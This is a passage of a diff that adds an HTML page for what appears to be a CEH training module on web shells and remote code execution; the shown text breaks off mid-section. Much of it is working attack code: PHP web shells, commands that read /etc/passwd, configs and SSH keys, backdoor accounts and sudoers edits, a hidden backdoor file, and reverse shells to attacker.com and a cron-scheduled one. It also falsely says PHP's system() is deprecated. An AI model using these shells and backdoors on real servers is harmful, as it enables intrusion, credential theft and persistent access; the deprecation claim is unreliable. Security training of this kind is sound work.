@@ -1,0 +1,1994 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>11_CEH - Web Shells & SQL Injection</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <h1 class="gradient-text">11_CEH Module</h1>
+            <p>Web Shells, Remote Code Execution & SQL Injection Attacks</p>
+        </div>
+    </div>
+
+    <div class="breadcrumb">
+        <span class="breadcrumb-item">CEH Training</span>
+        <span class="breadcrumb-separator">/</span>
+        <span class="breadcrumb-current">Module 11 - Web Shells & SQL Injection</span>
+    </div>
+
+    <div class="container">
+        <div class="sidebar">
+            <div class="sidebar-section">
+                <h3>Web Shells</h3>
+                <ul class="sidebar-links">
+                    <li><a onclick="switchTab('intro')" data-tab="intro">Module Overview</a></li>
+                    <li><a onclick="switchTab('webshell-intro')" data-tab="webshell-intro">Web Shell Basics</a></li>
+                    <li><a onclick="switchTab('php-system')" data-tab="php-system">system() Function</a></li>
+                    <li><a onclick="switchTab('php-shell')" data-tab="php-shell">shell_exec() Function</a></li>
+                    <li><a onclick="switchTab('php-exec')" data-tab="php-exec">exec() & passthru()</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Remote Code Execution</h3>
+                <ul class="sidebar-links">
+                    <li><a onclick="switchTab('rce-overview')" data-tab="rce-overview">RCE Overview</a></li>
+                    <li><a onclick="switchTab('rce-runtime')" data-tab="rce-runtime">Runtime Execution</a></li>
+                    <li><a onclick="switchTab('rce-payload')" data-tab="rce-payload">Payload Delivery</a></li>
+                    <li><a onclick="switchTab('rce-scenarios')" data-tab="rce-scenarios">Attack Scenarios</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>SQL Injection</h3>
+                <ul class="sidebar-links">
+                    <li><a onclick="switchTab('sql-intro')" data-tab="sql-intro">SQL Injection Intro</a></li>
+                    <li><a onclick="switchTab('sql-examples')" data-tab="sql-examples">Attack Examples</a></li>
+                    <li><a onclick="switchTab('sql-enumeration')" data-tab="sql-enumeration">Database Enumeration</a></li>
+                    <li><a onclick="switchTab('sql-tools')" data-tab="sql-tools">sqlmap Tool</a></li>
+                    <li><a onclick="switchTab('sql-prevention')" data-tab="sql-prevention">Prevention</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-section">
+                <h3>Summary</h3>
+                <ul class="sidebar-links">
+                    <li><a onclick="switchTab('defense')" data-tab="defense">Defense Strategies</a></li>
+                    <li><a onclick="switchTab('summary')" data-tab="summary">Module Completion</a></li>
+                </ul>
+            </div>
+
+            <div class="scroll-to-top" onclick="scrollToTop()">↑ Back to Top</div>
+        </div>
+
+        <div class="content">
+            <!-- Tab 1: Module Overview -->
+            <div class="tab-content active" id="intro">
+                <h2>Module 11: Web Shells & SQL Injection</h2>
+                <p class="subtitle">Remote Code Execution & Database Exploitation</p>
+
+                <div class="info-card">
+                    <h3>Module Objectives</h3>
+                    <ul>
+                        <li>Understand web shell concepts and deployment</li>
+                        <li>Master PHP functions: system(), shell_exec(), exec(), passthru()</li>
+                        <li>Execute commands via web server runtime parameters</li>
+                        <li>Craft SQL injection attacks for database access</li>
+                        <li>Use automated tools (sqlmap) for SQL injection testing</li>
+                        <li>Enumerate and extract sensitive database information</li>
+                    </ul>
+                </div>
+
+                <div class="threat-spectrum">
+                    <strong>Attack Impact Classification:</strong>
+                    <div class="spectrum-visual">
+                        <div class="spectrum-item" data-threat="Low">Web Shell Upload</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="Medium">RCE Access</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="High">SQL Injection</div>
+                        <div class="spectrum-arrow">→</div>
+                        <div class="spectrum-item" data-threat="Critical">Full Compromise</div>
+                    </div>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Attack Chain Flow</h3>
+                    <ol>
+                        <li><strong>Initial Compromise:</strong> Upload web shell to vulnerable directory</li>
+                        <li><strong>Command Access:</strong> Execute OS commands via HTTP requests</li>
+                        <li><strong>Database Discovery:</strong> Locate database and credentials</li>
+                        <li><strong>SQL Injection:</strong> Exploit database queries to extract data</li>
+                        <li><strong>Persistence:</strong> Maintain access for long-term exploitation</li>
+                    </ol>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ Legal & Ethical Notice</h3>
+                    <p>All techniques in this module are for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. Always obtain written permission before testing.</p>
+                </div>
+
+                <div class="success-box">
+                    <h3>Key Learning Outcomes</h3>
+                    <ul>
+                        <li>✓ Deploy functional web shells on target systems</li>
+                        <li>✓ Execute system commands remotely via HTTP</li>
+                        <li>✓ Identify SQL injection vulnerabilities in web applications</li>
+                        <li>✓ Extract sensitive data from databases</li>
+                        <li>✓ Maintain stealthy access on compromised systems</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 2: Web Shell Basics -->
+            <div class="tab-content" id="webshell-intro">
+                <h2>Web Shell Fundamentals</h2>
+                <p class="subtitle">Gateway to Remote Server Control</p>
+
+                <div class="concept-box">
+                    <h3>What is a Web Shell?</h3>
+                    <p>A web shell is a script (PHP, ASP, JSP, ASPX) placed on a web server that enables remote command execution through HTTP requests. It transforms the web server into a remote command interface.</p>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Web Shell Characteristics</h3>
+                    <ul>
+                        <li><strong>Server-Side Script:</strong> Executes on web server, not in browser</li>
+                        <li><strong>HTTP Access:</strong> Controlled via browser or HTTP tools</li>
+                        <li><strong>Command Execution:</strong> Runs OS commands with web server privileges</li>
+                        <li><strong>Persistent:</strong> Remains until discovered and removed</li>
+                        <li><strong>Stealthy:</strong> Can be hidden or encoded to evade detection</li>
+                        <li><strong>Flexible:</strong> Accept input via GET/POST/COOKIE parameters</li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <h3>Critical Threats from Web Shells</h3>
+                    <ul>
+                        <li><strong>Instant Access:</strong> No credentials needed after upload</li>
+                        <li><strong>Full Control:</strong> Execute any command web server can run</li>
+                        <li><strong>Data Theft:</strong> Access sensitive files and databases</li>
+                        <li><strong>Malware Deployment:</strong> Install backdoors, viruses, ransomware</li>
+                        <li><strong>Lateral Movement:</strong> Pivot to other systems on network</li>
+                        <li><strong>Persistence:</strong> Maintain access for months undetected</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Deployment Prerequisites</h3>
+                    <ul>
+                        <li><strong>Upload Capability:</strong> Writable directory (uploads, /tmp, /var/tmp)</li>
+                        <li><strong>Script Execution:</strong> Server must process PHP/ASP/JSP files</li>
+                        <li><strong>Permissions:</strong> File must be readable and executable</li>
+                        <li><strong>Access:</strong> Web path must be accessible via HTTP/HTTPS</li>
+                        <li><strong>No Filtering:</strong> WAF must not block script uploads or execution</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>Minimal PHP Web Shell (One-liner)</h4>
+                    <pre>&lt;?php system($_GET['cmd']); ?&gt;
+
+# Usage: http://target.com/shell.php?cmd=whoami
+# Usage: http://target.com/shell.php?cmd=cat%20/etc/passwd
+# Usage: http://target.com/shell.php?cmd=ps%20aux
+</pre>
+                </div>
+
+                <div class="code-example">
+                    <h4>Interactive Web Shell (HTML Interface)</h4>
+                    <pre>&lt;?php
+if(isset($_POST['cmd'])) {
+    $output = shell_exec($_POST['cmd']);
+}
+?&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Web Shell&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;form method="POST"&gt;
+&lt;input type="text" name="cmd" placeholder="Enter command"&gt;
+&lt;button type="submit"&gt;Execute&lt;/button&gt;
+&lt;/form&gt;
+&lt;pre&gt;&lt;?php echo $output; ?&gt;&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Web Shell Detection Indicators</h3>
+                    <ul>
+                        <li>New PHP files in web root with suspicious names</li>
+                        <li>Recently modified files in upload directories</li>
+                        <li>Unusual permissions on web accessible files (777, 755)</li>
+                        <li>Spike in web server process creation</li>
+                        <li>Unusual web server network connections (reverse shells)</li>
+                        <li>Large number of 200 responses to unusual URLs</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 3: system() Function -->
+            <div class="tab-content" id="php-system">
+                <h2>PHP system() Function</h2>
+                <p class="subtitle">Direct Command Execution with Output</p>
+
+                <div class="theory-card">
+                    <h3>system() Function Details</h3>
+                    <ul>
+                        <li><strong>Purpose:</strong> Execute external command and output directly</li>
+                        <li><strong>Syntax:</strong> system(command, return_var)</li>
+                        <li><strong>Output:</strong> Sent directly to browser stream</li>
+                        <li><strong>Return:</strong> Last line of output (as string)</li>
+                        <li><strong>Status:</strong> Populates return_var with exit code</li>
+                        <li><strong>Deprecated:</strong> In PHP 8.0+, but still used in legacy systems</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>system() Usage Examples</h4>
+                    <pre>&lt;?php
+// Example 1: Simple system() call
+system("ls -la /tmp");
+
+// Example 2: With return variable
+system("whoami", $status);
+if($status == 0) {
+    echo "Command successful";
+}
+
+// Example 3: Command from URL parameter
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+
+// Example 4: Capture and modify output (via shell_exec)
+$output = shell_exec("pwd");
+echo "Current: " . $output;
+?&gt;
+</pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Practical Web Shell with system()</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Create Basic Shell</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Create shell.php
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# Upload to web server at /var/www/html/shell.php
+# Or: /usr/share/nginx/html/shell.php
+# Or: C:\xampp\htdocs\shell.php
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Access Commands via URL</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Test 1: Show current user
+http://target.com/shell.php?cmd=whoami
+Output: www-data
+
+# Test 2: List directory
+http://target.com/shell.php?cmd=ls%20-la%20/home
+Output: total 8
+drwxr-xr-x  3 root root 4096 Apr  6 12:00 .
+drwxr-xr-x 19 root root 4096 Apr  6 11:00 ..
+drwxr-xr-x  2 user user 4096 Apr  6 12:00 user
+
+# Test 3: Show network info
+http://target.com/shell.php?cmd=ifconfig
+Output: eth0: flags=UP,BROADCAST,RUNNING
+        inet 192.168.1.50
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Read Sensitive Files</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Read /etc/passwd
+http://target.com/shell.php?cmd=cat%20/etc/passwd
+Output: 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+user:x:1000:1000:user:/home/user:/bin/bash
+
+# Read Apache config
+http://target.com/shell.php?cmd=cat%20/etc/apache2/apache2.conf
+Output: [configuration content]
+
+# Read database credentials
+http://target.com/shell.php?cmd=cat%20/var/www/html/config.php
+Output: $db_host = "localhost";
+$db_user = "webapp";
+$db_pass = "Secure123!";
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 4: Create Backdoor Account</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Add new user (if we have sudo)
+http://target.com/shell.php?cmd=sudo%20useradd%20-m%20-s%20/bin/bash%20attacker
+
+# Or add to sudoers (if writable)
+http://target.com/shell.php?cmd=echo%20"attacker%20ALL=(ALL)%20NOPASSWD:ALL"%20%3E%3E%20/etc/sudoers
+
+# Create SSH key for persistence
+http://target.com/shell.php?cmd=mkdir%20-p%20/home/attacker/.ssh
+http://target.com/shell.php?cmd=echo%20"ssh-rsa%20AAAA..."%20%3E%3E%20/home/attacker/.ssh/authorized_keys
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ system() Advantages for Attackers</h3>
+                    <ul>
+                        <li>Minimal code makes detection harder</li>
+                        <li>Direct output to browser shows results immediately</li>
+                        <li>Works with complex shell commands (pipes, redirects, &&, ||)</li>
+                        <li>Can capture exit status for error handling</li>
+                        <li>Commonly enabled in PHP default configuration</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 4: shell_exec() Function -->
+            <div class="tab-content" id="php-shell">
+                <h2>PHP shell_exec() Function</h2>
+                <p class="subtitle">Command Execution with String Return</p>
+
+                <div class="theory-card">
+                    <h3>shell_exec() Characteristics</h3>
+                    <ul>
+                        <li><strong>Purpose:</strong> Execute command via shell, return output as string</li>
+                        <li><strong>Syntax:</strong> $output = shell_exec(command)</li>
+                        <li><strong>Return:</strong> Complete command output as string</li>
+                        <li><strong>Output Type:</strong> Returns NULL if command fails</li>
+                        <li><strong>String Manipulation:</strong> Output can be stored, modified, formatted</li>
+                        <li><strong>Backtick Operator:</strong> `command` is equivalent to shell_exec()</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>shell_exec() Usage</h4>
+                    <pre>&lt;?php
+// Example 1: Basic execution and output
+$output = shell_exec("ls -la");
+echo "&lt;pre&gt;" . $output . "&lt;/pre&gt;";
+
+// Example 2: With pipes and filtering
+$users = shell_exec("cat /etc/passwd | grep home");
+echo $users;
+
+// Example 3: Backtick operator (equivalent)
+$whoami = `whoami`;
+echo "Current user: " . $whoami;
+
+// Example 4: Command substitution
+$files = shell_exec("find /var/www -name '*.php' -type f");
+$count = count(explode("\n", $files));
+echo "Found " . $count . " PHP files";
+
+// Example 5: Error handling
+$output = shell_exec("cat /etc/shadow 2>&1");
+if($output === null) {
+    echo "Command failed or permission denied";
+}
+?&gt;
+</pre>
+                </div>
+
+                <div class="code-example">
+                    <h4>Web Shell with shell_exec()</h4>
+                    <pre>&lt;?php
+if(isset($_REQUEST['cmd'])) {
+    $command = $_REQUEST['cmd'];
+    $output = shell_exec($command . " 2>&1");
+    echo "&lt;h3&gt;Output:&lt;/h3&gt;";
+    echo "&lt;pre style='color: #0f0; background: #000;'&gt;";
+    echo htmlspecialchars($output);
+    echo "&lt;/pre&gt;";
+} else {
+    echo "&lt;form method='POST'&gt;";
+    echo "&lt;input type='text' name='cmd' style='width:100%'&gt;";
+    echo "&lt;input type='submit' value='Execute'&gt;";
+    echo "&lt;/form&gt;";
+}
+?&gt;
+</pre>
+                </div>
+
+                <div class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Feature</th>
+                            <th>system()</th>
+                            <th>shell_exec()</th>
+                            <th>exec()</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Output Destination</strong></td>
+                            <td>Direct to browser</td>
+                            <td>Returned as string</td>
+                            <td>Returned as string (last line)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>String Manipulation</strong></td>
+                            <td>Not possible</td>
+                            <td>✓ Easy</td>
+                            <td>✓ Via array</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Exit Status</strong></td>
+                            <td>Available via 2nd param</td>
+                            <td>Not available</td>
+                            <td>✓ Via 3rd param</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Complex Commands</strong></td>
+                            <td>✓ Works well</td>
+                            <td>✓ Works well</td>
+                            <td>✓ Works well</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Array Output</strong></td>
+                            <td>Not available</td>
+                            <td>Need to explode()</td>
+                            <td>✓ Native</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="scenario-card">
+                    <h3>Practical Exploitation with shell_exec()</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Reconnaissance</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>#Command: Get system information
+$output = shell_exec("uname -a");
+
+# Expected Output:
+Linux target 5.4.0-42-generic #46-Ubuntu SMP Jul 10 2020 x86_64 GNU/Linux
+
+# Extract info:
+- OS: Linux
+- Kernel: 5.4.0-42
+- Architecture: x86_64 (64-bit)
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Enumerate Running Services</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>$output = shell_exec("netstat -tlnp 2>/dev/null");
+echo $output;
+
+# Output shows:
+Proto Local Address           Foreign Address         State       PID/Program name
+tcp   0.0.0.0:22              0.0.0.0:*              LISTEN      1234/sshd
+tcp   0.0.0.0:80              0.0.0.0:*              LISTEN      5678/apache2
+tcp   0.0.0.0:443             0.0.0.0:*              LISTEN      5678/apache2
+tcp   127.0.0.1:3306          0.0.0.0:*              LISTEN      9999/mysqld
+
+# Discovery: SSH, Apache, MySQL running
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Find Databases & Configs</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>$output = shell_exec("find /var/www/html -name 'config*.php' 2>/dev/null");
+echo $output;
+
+# Found:
+/var/www/html/config.php
+/var/www/html/db/config.php
+/var/www/html/includes/config.db.php
+
+# Read configs:
+$config = shell_exec("cat /var/www/html/config.php");
+echo $config;
+
+# Output:
+&lt;?php
+$db_host = "localhost";
+$db_name = "webapp";
+$db_user = "webapp_user";
+$db_pass = "P@ssw0rd123!";
+?&gt;
+</code>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab 5: exec() and passthru() -->
+            <div class="tab-content" id="php-exec">
+                <h2>PHP exec() & passthru() Functions</h2>
+                <p class="subtitle">Advanced Command Execution Methods</p>
+
+                <div class="theory-card">
+                    <h3>exec() Function</h3>
+                    <ul>
+                        <li><strong>Purpose:</strong> Execute command, return last line</li>
+                        <li><strong>Syntax:</strong> exec(command, output_array, status_code)</li>
+                        <li><strong>Output Array:</strong> Can populate array with all output lines</li>
+                        <li><strong>Status Code:</strong> Captures exit code for error checking</li>
+                        <li><strong>Usefulness:</strong> Best for capturing and processing output</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>passthru() Function</h3>
+                    <ul>
+                        <li><strong>Purpose:</strong> Execute command and output binary data</li>
+                        <li><strong>Syntax:</strong> passthru(command, status_code)</li>
+                        <li><strong>Output:</strong> Direct to browser (like system())</li>
+                        <li><strong>Binary Handling:</strong> Preserves binary output (images, files)</li>
+                        <li><strong>Use Case:</strong> Download files, display binary data</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h4>exec() Usage</h4>
+                    <pre>&lt;?php
+// Example 1: Basic exec()
+$last_line = exec("ls -la");
+echo "Last line: " . $last_line;
+
+// Example 2: Output array
+exec("ls -la", $output);
+foreach($output as $line) {
+    echo $line . "&lt;br&gt;";
+}
+
+// Example 3: With status code
+$return = 0;
+exec("whoami", $out, $return);
+echo "Exit code: " . $return;
+if($return == 0) {
+    echo "Success: " . $out[0];
+} else {
+    echo "Failed";
+}
+
+// Example 4: Process large output
+exec("cat /var/log/apache2/access.log", $lines);
+$total_lines = count($lines);
+echo "Total log lines: " . $total_lines;
+?&gt;
+</pre>
+                </div>
+
+                <div class="code-example">
+                    <h4>passthru() for File Download</h4>
+                    <pre>&lt;?php
+// Download files via passthru()
+if(isset($_GET['file'])) {
+    $file = $_GET['file'];
+    
+    // Security: whitelist files only
+    $allowed = array('config.php', 'database.sql');
+    
+    if(in_array($file, $allowed)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename=' . $file);
+        passthru("cat " . escapeshellarg($file));
+    }
+}
+
+// Example:
+// http://target.com/shell.php?file=config.php
+// Downloads config.php to attacker's machine
+?&gt;
+</pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Advanced Web Shell using exec()</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Multi-line Output Handler</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>&lt;?php
+if(isset($_POST['cmd'])) {
+    $command = $_POST['cmd'];
+    $output = array();
+    $status = 0;
+    
+    // Execute with output array
+    exec($command, $output, $status);
+    
+    echo "&lt;h3&gt;Exit Code: " . $status . "&lt;/h3&gt;";
+    echo "&lt;h3&gt;Output:&lt;/h3&gt;";
+    echo "&lt;pre&gt;";
+    foreach($output as $line) {
+        echo htmlspecialchars($line) . "\n";
+    }
+    echo "&lt;/pre&gt;";
+}
+?&gt;
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Reverse Shell Installation</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code>#Using exec() to install reverse shell
+$command = "bash -i >& /dev/tcp/attacker.com/4444 0>&1";
+exec($command, $output, $status);
+
+# Or using Metasploit payload:
+$payload = "bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'";
+exec(escapeshellcmd($payload));
+
+# Attacker listens:
+nc -lvnp 4444
+
+# Connection received from target system
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="danger-box">
+                    <h3>⚠️ RCE Function Risks</h3>
+                    <ul>
+                        <li>Direct OS command execution with no sandboxing</li>
+                        <li>Can bypass application-level security controls</li>
+                        <li>Allows arbitrary file access and modification</li>
+                        <li>Enables privilege escalation attacks</li>
+                        <li>Can deploy additional malware or backdoors</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 6: RCE Overview -->
+            <div class="tab-content" id="rce-overview">
+                <h2>Remote Code Execution (RCE) Overview</h2>
+                <p class="subtitle">Achieving Command-Level Access</p>
+
+                <div class="concept-box">
+                    <h3>What is Remote Code Execution?</h3>
+                    <p>RCE is the ability to execute arbitrary code or commands on a target system remotely. It's the most critical vulnerability because it gives attackers complete control over the compromised system.</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>RCE Severity Ranking</h3>
+                    <table class="comparison-table">
+                        <tr>
+                            <td><strong>Vulnerability Type</strong></td>
+                            <td><strong>Severity</strong></td>
+                            <td><strong>Impact</strong></td>
+                        </tr>
+                        <tr>
+                            <td>XSS (Cross-Site Scripting)</td>
+                            <td>Medium</td>
+                            <td>Client-side attacks only</td>
+                        </tr>
+                        <tr>
+                            <td>SQL Injection</td>
+                            <td>High</td>
+                            <td>Database compromise</td>
+                        </tr>
+                        <tr>
+                            <td>RCE (Remote Code Execution)</td>
+                            <td><span style="color: #ff0000;">CRITICAL</span></td>
+                            <td>Full system control</td>
+                        </tr>
+                    </table>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Common RCE Attack Vectors</h3>
+                    <ul>
+                        <li><strong>File Upload:</strong> Upload web shell to executable directory</li>
+                        <li><strong>Command Injection:</strong> Inject OS commands into application input</li>
+                        <li><strong>Code Injection:</strong> Inject PHP/Python code into eval() functions</li>
+                        <li><strong>Deserialization:</strong> Exploit unsafe object deserialization</li>
+                        <li><strong>Template Injection:</strong> Abuse template engines for code execution</li>
+                        <li><strong>XXE (XML External Entity):</strong> Execute commands via XML processing</li>
+                    </ul>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>RCE Attack Timeline</h3>
+                    <ol style="list-style-position: inside;">
+                        <li><strong>Reconnaissance:</strong> Identify vulnerable web application (2-4 hours)</li>
+                        <li><strong>Vulnerability Discovery:</strong> Find file upload or injection point (1-2 hours)</li>
+                        <li><strong>Payload Creation:</strong> Create web shell or exploit code (30 minutes)</li>
+                        <li><strong>Deployment:</strong> Upload shell or execute injection (5 minutes)</li>
+                        <li><strong>Access Verification:</strong> Test command execution (1 minute)</li>
+                        <li><strong>Privilege Escalation:</strong> Attempt to gain root/admin (variable)</li>
+                        <li><strong>Persistence:</strong> Install backdoors for future access (30 minutes)</li>
+                    </ol>
+                </div>
+
+                <div class="warning-box">
+                    <h3>⚠️ Post-RCE Exploitation</h3>
+                    <ul>
+                        <li>Enumerate system and network information</li>
+                        <li>Steal database credentials from config files</li>
+                        <li>Extract session cookies and authentication tokens</li>
+                        <li>Access sensitive files and directories</li>
+                        <li>Modify application code for persistence</li>
+                        <li>Create new user accounts or backdoors</li>
+                        <li>Deploy ransomware, miners, or malware</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Tab 7: Runtime Execution -->
+            <div class="tab-content" id="rce-runtime">
+                <h2>Runtime Command Execution</h2>
+                <p class="subtitle">Exploiting URL Parameters for OS Commands</p>
+
+                <div class="concept-box">
+                    <h3>Runtime Execution Concept</h3>
+                    <p>Passing OS commands through HTTP request parameters (GET, POST, COOKIE) to be executed by PHP functions. The web server processes the command as if it was entered from the command line.</p>
+                </div>
+
+                <div class="code-example">
+                    <h4>Basic Runtime Execution</h4>
+                    <pre># Vulnerable PHP code (original)
+&lt;?php
+$filename = $_GET['file'];
+system("cat " . $filename);
+?&gt;
+
+# Attacker input:
+http://target.com/view.php?file=/etc/passwd
+
+# Executed command:
+cat /etc/passwd
+
+# Output: Password file content displayed in browser
+</pre>
+                </div>
+
+                <div class="code-example">
+                    <h4>Command Chaining in Runtime Execution</h4>
+                    <pre># Using semicolon to chain commands
+http://target.com/shell.php?cmd=ls;whoami;id
+
+# Using && (if previous succeeds)
+http://target.com/shell.php?cmd=cat%20/etc/shadow%20&&%20echo%20"Success"
+
+# Using || (if previous fails)
+http://target.com/shell.php?cmd=cat%20/root/file%20||%20echo%20"Access Denied"
+
+# Using | (pipe)
+http://target.com/shell.php?cmd=cat%20/etc/passwd%20|%20grep%20root
+
+# Using > (redirect)
+http://target.com/shell.php?cmd=whoami%20>%20/tmp/test.txt
+
+# Using $() (command substitution)
+http://target.com/shell.php?cmd=echo%20$(whoami)
+</pre>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Runtime Execution Attack Progression</h3>
+                    
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 1: Initial Reconnaissance</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Command 1: Verify RCE
+http://target.com/shell.php?cmd=whoami
+Output: www-data
+
+# Command 2: Check system
+http://target.com/shell.php?cmd=uname%20-a
+Output: Linux server 5.4.0 #1 SMP x86_64 GNU/Linux
+
+# Command 3: Network info
+http://target.com/shell.php?cmd=ifconfig%20eth0
+Output: inet 192.168.1.50 netmask 255.255.255.0
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 2: Privilege Discovery</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Check sudo permissions
+http://target.com/shell.php?cmd=sudo%20-l
+Output: User www-data may run (ALL) NOPASSWD: /usr/bin/wget
+
+# Check writable directories
+http://target.com/shell.php?cmd=find%20/%20-writable%20-type%20d%202>/dev/null
+Output: /tmp
+/var/tmp
+/var/www/html/uploads
+
+# Check currently running processes
+http://target.com/shell.php?cmd=ps%20aux%20|%20grep%20root
+Output: root       1234   0.0   0.2   1234 abc mysqld
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 3: Credential Harvesting</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Read database config
+http://target.com/shell.php?cmd=cat%20/var/www/html/config/db.php
+Output: 
+$db_host = "localhost"
+$db_user = "webapp"
+$db_pass = "MyP@ss123!"
+
+# Read SSH keys
+http://target.com/shell.php?cmd=cat%20/home/user/.ssh/id_rsa
+Output: -----BEGIN PRIVATE KEY-----
+MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAg...
+-----END PRIVATE KEY-----
+
+# Check bash history
+http://target.com/shell.php?cmd=cat%20/home/user/.bash_history
+Output: mysql -u root -p
+./deploy.sh
+</code>
+                        </div>
+                    </div>
+
+                    <div class="sim-step">
+                        <div class="step-header">
+                            <div><strong>Step 4: Persistence Installation</strong></div>
+                            <div class="toggle-icon">▼</div>
+                        </div>
+                        <div class="step-content">
+                            <code># Create hidden backdoor shell
+http://target.com/shell.php?cmd=echo%20"<?php%20system($_REQUEST['x']);%20?>"%20>%20/var/www/html/.t.php
+
+# Verify backdoor created
+http://target.com/shell.php?cmd=ls%20-la%20/var/www/html/.t.php
+Output: -rw-r--r-- 1 www-data www-data 35 Apr 6 13:00 .t.php
+
+# Use backdoor
+http://target.com/.t.php?x=whoami
+
+# Create cron backdoor for reverse shell
+http://target.com/shell.php?cmd=echo%20"*/5%20*%20*%20*%20*%20bash%20-i%20>%26%20/dev/tcp/attacker/4444%200>%261"%20|%20crontab%20-
+Output: Cron job installed
+
+# Now attacker gets shell every 5 minutes even if original shell is deleted
+</code>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="success-box">
+                    <h3>✓ URL Parameter Encoding Reference</h3>
+                    <ul style="list-style: none;">
+                        <li>Space = %20</li>
+                        <li>/ = %2F</li>
+                        <li>| (pipe) = %7C</li>
+                        <li>& (ampersand) = %26</li>
+                        <li>; (semicolon) = %3B</li>
+                        <li>&gt; (greater than) = %3E</li>
+                        <li>< (less than) = %3C</li>
+                        <li>" (quote) = %22</li>
